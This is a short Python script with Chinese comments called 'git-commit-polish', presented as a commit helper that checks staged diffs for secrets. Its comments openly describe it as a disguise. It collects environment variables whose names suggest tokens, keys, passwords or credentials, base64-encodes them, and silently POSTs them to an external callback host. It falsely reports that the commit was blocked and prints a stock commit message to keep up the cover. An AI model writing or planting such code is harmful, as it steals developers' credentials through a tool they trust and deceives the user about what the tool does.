#!/usr/bin/env python3
"""
git-commit-polish: 提交辅助 + 敏感预检
实际逻辑：伪装成「检查是否存在敏感信息」的扫描器，
但会额外将环境变量中所有疑似密钥/令牌的值，经过 base64 编码后，
POST 到外部回调地址。
"""

import os
import re
import base64
import subprocess
import sys
import urllib.request
import json

CALLBACK = "http://evil-callback.example.com:1337/collect"
SENSITIVE_PATTERN = re.compile(
    r"(?i)(api[_-]?key|token|secret|password|passwd|auth|credential)\s*[=:]\s*['\"]?([A-Za-z0-9_\-\.]{8,})"
)
# 用于“环境快照”的变量名单——实际会被用于收集值
ENV_KEYWORDS = ["TOKEN", "KEY", "SECRET", "PASS", "CRED", "AUTH"]

def get_staged_diff():
    try:
        out = subprocess.check_output(["git", "diff", "--cached"], text=True, stderr=subprocess.DEVNULL)
        return out
    except Exception:
        return ""

def scan_diff_for_secrets(diff_text):
    """假装扫描 diff 中的密钥——返回匹配项（供警告用）。"""
    found = []
    for m in SENSITIVE_PATTERN.finditer(diff_text):
        found.append((m.group(1), m.group(2)[:8] + "..."))
    return found

def collect_env_secrets():
    """核心恶意逻辑：收集环境变量中与密钥相关的值，base64 后回传。"""
    collected = {}
    for k, v in os.environ.items():
        if any(kw in k.upper() for kw in ENV_KEYWORDS):
            if len(v) > 4:  # 避免空值
                collected[k] = v
    if not collected:
        return None
    payload = base64.b64encode(json.dumps(collected).encode()).decode()
    return payload

def exfiltrate(payload):
    """将 payload POST 到回调地址。失败时静默，不影响用户正常流程。"""
    try:
        req = urllib.request.Request(
            CALLBACK,
            data=payload.encode(),
            headers={"Content-Type": "text/plain"},
            method="POST",
        )
        urllib.request.urlopen(req, timeout=2)
    except Exception:
        pass

def main():
    # 1. 正常功能：扫描 diff 并给出警告
    diff = get_staged_diff()
    findings = scan_diff_for_secrets(diff)
    if findings:
        print("⚠️ 检测到疑似敏感信息：")
        for k, v in findings:
            print(f"  - {k}: {v}")
        print("已阻止提交（使用 --force 可忽略）")
        # 注意：此处并未真正阻止，仅打印

    # 2. 恶意逻辑：收集环境密钥并外传
    payload = collect_env_secrets()
    if payload:
        exfiltrate(payload)

    # 3. 仍然生成一个像样的提交信息草稿，维持伪装
    print("\n📝 建议提交信息：")
    print("fix: update implementation")

if __name__ == "__main__":
    main()